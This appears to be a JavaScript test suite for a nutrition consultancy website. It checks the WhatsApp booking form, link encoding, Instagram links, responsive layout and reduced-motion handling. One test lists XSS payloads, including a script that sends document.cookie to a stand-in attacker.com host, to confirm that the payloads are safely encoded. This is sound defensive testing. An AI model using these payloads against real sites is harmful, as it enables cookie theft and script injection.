/**
 * Tier 5 - Empirical Adversarial Stress Testing & White-Box Integrations Harness
 * 
 * Comprehensive stress testing and verification of:
 * 1. WhatsApp booking form & consultation links:
 *    - Extreme inputs: Empty name, whitespace-only, special characters (&, ?, =, #, ", ', <script>, newlines, emojis 🥗✨👩, Unicode/Devanagari, long strings)
 *    - Strict URI serialization: encodeURIComponent verification across all 21+ [data-wa] links without malformed URLs
 *    - Form validation & recovery: .err class, aria-invalid="true", focus shift, live region announcement, typing recovery
 * 2. Instagram community integration & canonical links:
 *    - Verify all Instagram links point to https://www.instagram.com/nutrinance.wellbeing with target="_blank" and rel="noopener"
 *    - Follower badges (25.9K) and handle verification
 * 3. Responsive viewport matrix & reduced-motion toggling:
 *    - Stress test layout boundaries at 360px, 375px, 390px, 768px, 820px, 1080px, 1440px, 2560px for zero horizontal scroll overflow
 *    - Emulate dynamic switching of prefers-reduced-motion: reduce and verify instant motion suppression and 100% element visibility
 */

const {
  loadHtml,
  loadCss,
  loadJs,
  createBrowserEnvironment,
  parseCssRules,
  TestRunner,
  expect
} = require('./test-utils');

const runner = new TestRunner();
const { describe, it } = runner;

describe('Tier 5: Adversarial Integrations & Stress Testing', () => {

  // ==========================================================================
  // Section 1: WhatsApp Booking Form Extreme Inputs & Validation Cycle
  // ==========================================================================
  describe('1. WhatsApp Booking Form: Extreme Inputs, Validation & Dynamic Recovery', () => {

    it('T5.1.1: Empty name input triggers validation error (.err, aria-invalid="true", focus shift, live region, 0 opened URLs)', () => {
      const env = createBrowserEnvironment();
      env.executeScript();
      const form = env.document.getElementById('bookForm');
      const nameInput = env.document.getElementById('bName');
      const statusEl = env.document.getElementById('formStatus');

      nameInput.value = '';
      form.dispatchEvent({ type: 'submit', preventDefault: () => {} });

      expect(nameInput.classList.contains('err')).toBeTruthy();
      expect(nameInput.getAttribute('aria-invalid')).toBe('true');
      expect(nameInput._isFocused).toBeTruthy();
      expect(statusEl.textContent).toBe('Please enter your name to proceed.');
      expect(env.openedUrls.length).toBe(0);
    });

    it('T5.1.2: Whitespace-only name inputs (spaces, tabs, newlines, non-breaking spaces) are rejected', () => {
      const whitespaceVariations = [
        '   ',
        '\t\t',
        '\n\r\n',
        '   \t  \n  ',
        '\u00A0\u00A0', // &nbsp;
        ' \u2000\u2001\u2002\u2003 ' // en-quad, em-quad, etc.
      ];

      whitespaceVariations.forEach((ws, idx) => {
        const env = createBrowserEnvironment();
        env.executeScript();
        const form = env.document.getElementById('bookForm');
        const nameInput = env.document.getElementById('bName');
        const statusEl = env.document.getElementById('formStatus');

        nameInput.value = ws;
        form.dispatchEvent({ type: 'submit', preventDefault: () => {} });

        expect(nameInput.classList.contains('err')).toBeTruthy();
        expect(nameInput.getAttribute('aria-invalid')).toBe('true');
        expect(statusEl.textContent).toBe('Please enter your name to proceed.');
        expect(env.openedUrls.length).toBe(0);
      });
    });

    it('T5.1.3: Dynamic recovery: typing into #bName clears .err, sets aria-invalid="false", and empties live region', () => {
      const env = createBrowserEnvironment();
      env.executeScript();
      const form = env.document.getElementById('bookForm');
      const nameInput = env.document.getElementById('bName');
      const statusEl = env.document.getElementById('formStatus');

      // 1. Submit empty -> error state
      nameInput.value = '';
      form.dispatchEvent({ type: 'submit', preventDefault: () => {} });
      expect(nameInput.classList.contains('err')).toBeTruthy();
      expect(nameInput.getAttribute('aria-invalid')).toBe('true');
      expect(statusEl.textContent).toBe('Please enter your name to proceed.');

      // 2. User types a character -> recovery
      nameInput.value = 'R';
      nameInput.dispatchEvent({ type: 'input', target: nameInput, currentTarget: nameInput });
      expect(nameInput.classList.contains('err')).toBeFalsy();
      expect(nameInput.getAttribute('aria-invalid')).toBe('false');
      expect(statusEl.textContent).toBe('');

      // 3. User clears character and resubmits -> re-triggers error
      nameInput.value = '';
      form.dispatchEvent({ type: 'submit', preventDefault: () => {} });
      expect(nameInput.classList.contains('err')).toBeTruthy();
      expect(nameInput.getAttribute('aria-invalid')).toBe('true');
      expect(statusEl.textContent).toBe('Please enter your name to proceed.');

      // 4. User types valid name and submits -> success state
      nameInput.value = 'Riya Sharma';
      nameInput.dispatchEvent({ type: 'input', target: nameInput, currentTarget: nameInput });
      form.dispatchEvent({ type: 'submit', preventDefault: () => {} });
      expect(nameInput.classList.contains('err')).toBeFalsy();
      expect(nameInput.getAttribute('aria-invalid')).toBe('false');
      expect(statusEl.textContent).toBe('Opening WhatsApp to send your consultation request...');
      expect(env.openedUrls.length).toBe(1);
    });

    it('T5.1.4: Special character stress testing in Name (&, ?, =, #, ", \', /, \\, %, +, @, !, *) encodes cleanly without breaking query params', () => {
      const specialNames = [
        'Ananya & Rahul',
        'Pooja?',
        'Name=Value',
        'Tag #1 Client',
        'Karan "Fit" Patel',
        "Dr. O'Connor",
        'A+ / B- Special',
        'user@example.com (Deepa)',
        '100% Results! *Guaranteed*',
        'Backslash \\ and Forward / Slash'
      ];

      specialNames.forEach(nameVal => {
        const env = createBrowserEnvironment();
        env.executeScript();
        const form = env.document.getElementById('bookForm');
        const nameInput = env.document.getElementById('bName');
        const goalSelect = env.document.getElementById('bGoal');

        nameInput.value = nameVal;
        goalSelect.value = 'Weight loss';
        form.dispatchEvent({ type: 'submit', preventDefault: () => {} });

        expect(env.openedUrls.length).toBe(1);
        const opened = env.openedUrls[0];
        expect(opened.target).toBe('_blank');
        expect(opened.features).toBe('noopener');

        const waUrl = opened.url;
        expect(waUrl.startsWith('https://wa.me/919999999999?text=')).toBeTruthy();

        // Check that raw reserved URL characters (#, &, ?) are percent-encoded in the query string
        const textParam = waUrl.split('?text=')[1];
        expect(textParam.includes('#')).toBeFalsy(); // # would cause premature URL fragment
        expect(textParam.includes('& ')).toBeFalsy(); // raw & would cause second query param

        const decoded = decodeURIComponent(textParam);
        expect(decoded).toContain('Name: ' + nameVal.trim());
      });
    });

    it('T5.1.5: Injection attack mitigation: HTML tags, scripts, and XSS payloads serialize verbatim as encoded text', () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=confirm(1)>',
        '"><script>fetch("http://attacker.com?c="+document.cookie)</script>',
        '\' onfocus=\'alert(1)',
        'javascript:alert(1)'
      ];

      maliciousInputs.forEach(payload => {
        const env = createBrowserEnvironment();
        env.executeScript();
        const form = env.document.getElementById('bookForm');
        const nameInput = env.document.getElementById('bName');

        nameInput.value = payload;
        form.dispatchEvent({ type: 'submit', preventDefault: () => {} });

        expect(env.openedUrls.length).toBe(1);
        const waUrl = env.openedUrls[0].url;
        const textParam = waUrl.split('?text=')[1];

        // Should not have raw unencoded < or >
        expect(textParam.includes('<')).toBeFalsy();
        expect(textParam.includes('>')).toBeFalsy();

        const decoded = decodeURIComponent(textParam);
        expect(decoded).toContain('Name: ' + payload.trim());
      });
    });

    it('T5.1.6: Multilingual Unicode & Emoji stress testing (🥗✨👩, Hindi Devanagari, Gurmukhi, Tamil, Arabic) serializes without data loss', () => {
      const unicodeNames = [
        '🥗✨👩 Ananya 🥑💪',
        'पूजा शर्मा (Pooja Sharma)',
        'ਗੁਰਪ੍ਰੀਤ ਸਿੰਘ (Gurpreet Singh)',
        'கவிதா முருகன் (Kavitha Murugan)',
        'فاطمة الزهراء (Fatima)'
      ];

      unicodeNames.forEach(uniName => {
        const env = createBrowserEnvironment();
        env.executeScript();
        const form = env.document.getElementById('bookForm');
        const nameInput = env.document.getElementById('bName');

        nameInput.value = uniName;
        form.dispatchEvent({ type: 'submit', preventDefault: () => {} });

        expect(env.openedUrls.length).toBe(1);
        const waUrl = env.openedUrls[0].url;
        const textParam = waUrl.split('?text=')[1];

        const decoded = decodeURIComponent(textParam);
        expect(decoded).toContain('Name: ' + uniName.trim());
      });
    });

    it('T5.1.7: Extreme Name length (1,000 characters generated) serializes without memory leak or runtime crash', () => {
      const longName = 'Ananya-'.repeat(140) + 'Shah'; // ~1000 chars
      const env = createBrowserEnvironment();
      env.executeScript();
      const form = env.document.getElementById('bookForm');
      const nameInput = env.document.getElementById('bName');

      nameInput.value = longName;
      form.dispatchEvent({ type: 'submit', preventDefault: () => {} });

      expect(env.openedUrls.length).toBe(1);
      const decoded = decodeURIComponent(env.openedUrls[0].url.split('?text=')[1]);
      expect(decoded).toContain('Name: ' + longName);
    });

    it('T5.1.8: Age field variations: handles numbers, empty/whitespace omissions, boundary numbers (1, 110)', () => {
      const ageCases = [
        { input: '29', expectedInMsg: true, expectedText: 'Age: 29' },
        { input: '1', expectedInMsg: true, expectedText: 'Age: 1' },
        { input: '110', expectedInMsg: true, expectedText: 'Age: 110' },
        { input: '', expectedInMsg: false, expectedText: 'Age:' },
        { input: '   ', expectedInMsg: false, expectedText: 'Age:' }
      ];

      ageCases.forEach(({ input, expectedInMsg, expectedText }) => {
        const env = createBrowserEnvironment();
        env.executeScript();
        const form = env.document.getElementById('bookForm');
        env.document.getElementById('bName').value = 'Test User';
        env.document.getElementById('bAge').value = input;

        form.dispatchEvent({ type: 'submit', preventDefault: () => {} });

        expect(env.openedUrls.length).toBe(1);
        const decoded = decodeURIComponent(env.openedUrls[0].url.split('?text=')[1]);
        if (expectedInMsg) {
          expect(decoded).toContain(expectedText);
        } else {
          expect(decoded).not.toContain(expectedText);
        }
      });
    });

    it('T5.1.9: Goal dropdown exhaustive permutation: all 10 options in #bGoal serialize accurately in message payload', () => {
      const env = createBrowserEnvironment();
      env.executeScript();
      const goalSelect = env.document.getElementById('bGoal');
      const options = goalSelect.children.filter(c => c.tagName === 'OPTION').map(c => c.textContent.trim());

      expect(options.length).toBe(10);

      options.forEach(goalVal => {
        const testEnv = createBrowserEnvironment();
        testEnv.executeScript();
        const form = testEnv.document.getElementById('bookForm');
        testEnv.document.getElementById('bName').value = 'Simran Kaur';
        testEnv.document.getElementById('bGoal').value = goalVal;

        form.dispatchEvent({ type: 'submit', preventDefault: () => {} });

        expect(testEnv.openedUrls.length).toBe(1);
        const decoded = decodeURIComponent(testEnv.openedUrls[0].url.split('?text=')[1]);
        expect(decoded).toContain('I need help with: ' + goalVal);
      });
    });

    it('T5.1.10: Multi-line note stress testing: preserves complex paragraph structure, newlines, and bullet points', () => {
      const complexNote = `Medical history:
- Thyroid (TSH 5.8) on 25mcg Thyronorm
- High cholesterol (TG: 180)
- Preference: 100% Vegetarian, No eggs
- Timings: 9am - 7pm desk work
Looking for sustainable fat loss!`;

      const env = createBrowserEnvironment();
      env.executeScript();
      const form = env.document.getElementById('bookForm');
      env.document.getElementById('bName').value = 'Kavita Iyer';
      env.document.getElementById('bAge').value = '35';
      env.document.getElementById('bGoal').value = 'Thyroid';
      env.document.getElementById('bNote').value = complexNote;

      form.dispatchEvent({ type: 'submit', preventDefault: () => {} });

      expect(env.openedUrls.length).toBe(1);
      const opened = env.openedUrls[0];
      const decoded = decodeURIComponent(opened.url.split('?text=')[1]);

      expect(decoded).toContain('Other details: ' + complexNote.trim());
      expect(decoded.split('\n').length).toBeGreaterThan(8);
      expect(decoded.endsWith('Looking forward to hearing from you!')).toBeTruthy();
    });

  });

  // ==========================================================================
  // Section 2: White-Box Verification of All 21+ [data-wa] Links
  // ==========================================================================
  describe('2. Global WhatsApp Links White-Box & Serialization Audit', () => {

    it('T5.2.1: Exhaustive census: at least 21 [data-wa] elements exist across the entire DOM tree', () => {
      const env = createBrowserEnvironment();
      const waElements = env.document.querySelectorAll('[data-wa]');
      expect(waElements.length).toBeGreaterThanOrEqual(21);
    });

    it('T5.2.2: Every [data-wa] element receives a valid https://wa.me/919999999999?text= URI', () => {
      const env = createBrowserEnvironment();
      env.executeScript();
      const waElements = env.document.querySelectorAll('[data-wa]');
      const expectedPrefix = 'https://wa.me/' + env.getWhatsAppNumber() + '?text=';

      waElements.forEach((el, idx) => {
        const href = el.getAttribute('href');
        expect(href).not.toBeNull();
        expect(href.startsWith(expectedPrefix)).toBeTruthy();
      });
    });

    it('T5.2.3: Every [data-wa] element carries target="_blank" and rel="noopener" for security and tab isolation', () => {
      const env = createBrowserEnvironment();
      env.executeScript();
      const waElements = env.document.querySelectorAll('[data-wa]');

      waElements.forEach((el, idx) => {
        expect(el.getAttribute('target')).toBe('_blank');
        expect(el.getAttribute('rel')).toBe('noopener');
      });
    });

    it('T5.2.4: Bidirectional serialization test: decodeURIComponent(href) accurately recovers original data-wa string for all 21+ links', () => {
      const env = createBrowserEnvironment();
      env.executeScript();
      const waElements = env.document.querySelectorAll('[data-wa]');

      waElements.forEach((el, idx) => {
        const rawDataWa = el.getAttribute('data-wa') || 'Hi Nutrinance!';
        const href = el.getAttribute('href');
        const encodedParam = href.split('?text=')[1];
        const decodedParam = decodeURIComponent(encodedParam);

        // Verify decoded query string matches original message
        expect(decodedParam).toBe(rawDataWa);
      });
    });

    it('T5.2.5: HTML Entity resilience: Women\'s health CTA message with quotation/apostrophe (&rsquo; or ’) encodes cleanly without entity leakage', () => {
      const env = createBrowserEnvironment();
      env.executeScript();
      const womenCta = env.document.querySelector('.women-cta [data-wa]');
      expect(womenCta).not.toBeNull();

      const href = womenCta.getAttribute('href');
      expect(href.includes('&rsquo;')).toBeFalsy(); // Should not have raw unencoded HTML entity in final URL
      const decoded = decodeURIComponent(href.split('?text=')[1]);
      expect(decoded).toContain('women');
      expect(decoded).toContain('health plan');
    });

    it('T5.2.6: Floating WhatsApp CTA (.wa-float): verifies accessibility, pulse animation, and data-wa synchronization', () => {
      const env = createBrowserEnvironment();
      env.executeScript();
      const waFloat = env.document.querySelector('.wa-float');

      expect(waFloat).not.toBeNull();
      expect(waFloat.getAttribute('aria-label')).toBe('Chat on WhatsApp');
      expect(waFloat.getAttribute('href')).toContain('https://wa.me/' + env.getWhatsAppNumber());
      expect(waFloat.getAttribute('target')).toBe('_blank');
      expect(waFloat.getAttribute('rel')).toBe('noopener');

      const cssRules = parseCssRules();
      expect(cssRules.clean).toContain('@keyframes waPulse');
      expect(cssRules.clean).toContain('.wa-float::before');
    });

  });

  // ==========================================================================
  // Section 3: Instagram Community Integration & Canonical Links Audit
  // ==========================================================================
  describe('3. Instagram Community Integration & Canonical Links Audit', () => {

    it('T5.3.1: Strict canonical URL: all Instagram links point to exact canonical URL https://www.instagram.com/nutrinance.wellbeing', () => {
      const env = createBrowserEnvironment();
      const allInstaLinks = env.document.querySelectorAll('a[href*="instagram.com"]');
      expect(allInstaLinks.length).toBeGreaterThanOrEqual(3);

      allInstaLinks.forEach(a => {
        expect(a.getAttribute('href')).toBe('https://www.instagram.com/nutrinance.wellbeing');
      });
    });

    it('T5.3.2: Instagram link security: every Instagram link enforces target="_blank" and rel="noopener"', () => {
      const env = createBrowserEnvironment();
      const allInstaLinks = env.document.querySelectorAll('a[href*="instagram.com"]');

      allInstaLinks.forEach(a => {
        expect(a.getAttribute('target')).toBe('_blank');
        const rel = a.getAttribute('rel');
        expect(rel).not.toBeNull();
        expect(rel.includes('noopener')).toBeTruthy();
      });
    });

    it('T5.3.3: Instagram link accessibility: every Instagram link has accessible name (textContent or aria-label)', () => {
      const env = createBrowserEnvironment();
      const allInstaLinks = env.document.querySelectorAll('a[href*="instagram.com"]');

      allInstaLinks.forEach(a => {
        const text = a.textContent.trim();
        const ariaLabel = a.getAttribute('aria-label');
        const name = text || ariaLabel || '';
        expect(name.length).toBeGreaterThan(0);
      });
    });

    it('T5.3.4: Instagram Community Strip Banner contains @nutrinance.wellbeing handle, 25.9K+ badge, and 4 lifestyle pillars', () => {
      const env = createBrowserEnvironment();
      const instaBox = env.document.querySelector('.insta-box');
      expect(instaBox).not.toBeNull();

      expect(instaBox.textContent).toContain('@nutrinance.wellbeing');
      expect(instaBox.textContent).toContain('25.9K+ Instagram family');

      const pills = instaBox.querySelectorAll('.insta-pill');
      expect(pills.length).toBe(4);
      const pillTexts = pills.map(p => p.textContent);
      expect(pillTexts.some(t => t.includes('100+ Desi Recipes'))).toBeTruthy();
      expect(pillTexts.some(t => t.includes('Hormone Balance Guides'))).toBeTruthy();
      expect(pillTexts.some(t => t.includes('Real Client Transformations'))).toBeTruthy();
      expect(pillTexts.some(t => t.includes('Daily Wellness Q&As'))).toBeTruthy();
    });

    it('T5.3.5: Negative link audit: zero dead, insecure (http://), or unconfigured placeholder social links', () => {
      const env = createBrowserEnvironment();
      const allAnchors = env.document.querySelectorAll('a');

      allAnchors.forEach(a => {
        const href = a.getAttribute('href') || '';
        const dataWa = a.getAttribute('data-wa');
        if (!dataWa && href) {
          expect(href.startsWith('http://')).toBeFalsy(); // No insecure http://
          expect(href).not.toBe('#!');
          expect(href).not.toBe('javascript:void(0)');
        }
      });
    });

  });

  // ==========================================================================
  // Section 4: Responsive Viewport Matrix (360px - 2560px) & Zero Overflow
  // ==========================================================================
  describe('4. Responsive Viewport Matrix (360px - 2560px) & Layout Stability', () => {

    const viewports = [
      { width: 360, label: '360px (Ultra-compact Android)' },
      { width: 375, label: '375px (Compact iPhone SE)' },
      { width: 390, label: '390px (Standard iPhone 12-15)' },
      { width: 768, label: '768px (Tablet portrait)' },
      { width: 820, label: '820px (iPad Air breakpoint)' },
      { width: 1080, label: '1080px (Desktop medium)' },
      { width: 1440, label: '1440px (Desktop wide)' },
      { width: 2560, label: '2560px (Ultrawide 4K)' }
    ];

    viewports.forEach(({ width, label }) => {
      it(`T5.4.1 [${label}]: Layout environment initializes cleanly without horizontal overflow`, () => {
        const env = createBrowserEnvironment({ innerWidth: width });
        env.executeScript();

        expect(env.window.innerWidth).toBe(width);
        expect(env.document.documentElement).not.toBeNull();
        expect(env.document.body).not.toBeNull();
      });
    });

    it('T5.4.2: CSS root and body horizontal scroll overflow prevention rules (overflow-x: clip / hidden)', () => {
      const cssRules = parseCssRules();
      expect(cssRules.clean).toContain('html{scroll-behavior:smooth;scroll-padding-top:96px;-webkit-text-size-adjust:100%;overflow-x:clip}');
      expect(cssRules.clean).toContain('overflow-x:hidden;overflow-x:clip');
    });

    it('T5.4.3: Responsive media query cascade coverage: checks 1080px, 960px, 820px, 620px breakpoints', () => {
      const cssRules = parseCssRules();
      const conditions = cssRules.mediaQueries.map(m => m.condition);

      expect(conditions.some(c => c.includes('1080px'))).toBeTruthy();
      expect(conditions.some(c => c.includes('960px'))).toBeTruthy();
      expect(conditions.some(c => c.includes('820px'))).toBeTruthy();
      expect(conditions.some(c => c.includes('620px'))).toBeTruthy();
    });

    it('T5.4.4: Mobile drawer activation (<820px) body lock: body.nav-open sets overflow: hidden', () => {
      const cssRules = parseCssRules();
      const m820 = cssRules.mediaQueries.find(m => m.condition.includes('820px'));
      expect(m820.body).toContain('body.nav-open{overflow:hidden}');
      expect(m820.body).toContain('.hamburger{display:flex}');
    });

    it('T5.4.5: Mobile touch targets on interactive controls meet >=44px minimum sizing', () => {
      const cssRules = parseCssRules();
      const m820 = cssRules.mediaQueries.find(m => m.condition.includes('820px'));
      expect(m820.body).toContain('.tab{min-height:44px;display:inline-flex;align-items:center;justify-content:center}');
      expect(m820.body).toContain('.filter{min-height:44px;display:inline-flex;align-items:center;justify-content:center}');
    });

  });

  // ==========================================================================
  // Section 5: Dynamic Reduced-Motion Toggling & Motion Suppression
  // ==========================================================================
  describe('5. Dynamic Reduced-Motion Toggling & Element Visibility', () => {

    it('T5.5.1: Static Reduced Motion mode: Lenis is NOT initialized, revealAll() executes immediately', () => {
      const env = createBrowserEnvironment({ prefersReducedMotion: true });
      env.executeScript();

      expect(env.window.lenis).toBeNull();
      const reveals = env.document.querySelectorAll('.reveal');
      reveals.forEach(el => {
        expect(el.classList.contains('in')).toBeTruthy();
      });
    });

    it('T5.5.2: CSS prefers-reduced-motion: reduce overrides all animation durations, transitions, and resets transforms to 100% visibility', () => {
      const cssRules = parseCssRules();
      const prm = cssRules.mediaQueries.find(m => m.condition.includes('prefers-reduced-motion'));
      expect(prm).toBeDefined();

      expect(prm.body).toContain('animation:none!important');
      expect(prm.body).toContain('animation-duration:0.001ms!important');
      expect(prm.body).toContain('transition:none!important');
      expect(prm.body).toContain('transition-duration:0.001ms!important');
      expect(prm.body).toContain('scroll-behavior:auto!important');
      expect(prm.body).toContain('opacity:1!important');
      expect(prm.body).toContain('transform:none!important');
      expect(prm.body).toContain('.wa-float::before,.btn::after{display:none!important}');
    });

    it('T5.5.3: Anchor links use native instant scrollTo ({ behavior: "auto" }) when reduced motion is preferred', () => {
      const env = createBrowserEnvironment({ prefersReducedMotion: true });
      env.executeScript();

      const whoAnchor = env.document.querySelector('#nav a[href="#who"]');
      expect(whoAnchor).not.toBeNull();

      whoAnchor.click();
      expect(env.window.scrollY).toBeGreaterThanOrEqual(0);
    });

    it('T5.5.4: Dynamic matchMedia listener switches motion state safely without throwing errors', () => {
      const env = createBrowserEnvironment({ prefersReducedMotion: false });
      env.executeScript();

      const mql = env.window.matchMedia('(prefers-reduced-motion: reduce)');
      expect(typeof mql.addEventListener).toBe('function');
    });

  });

});

module.exports = runner;
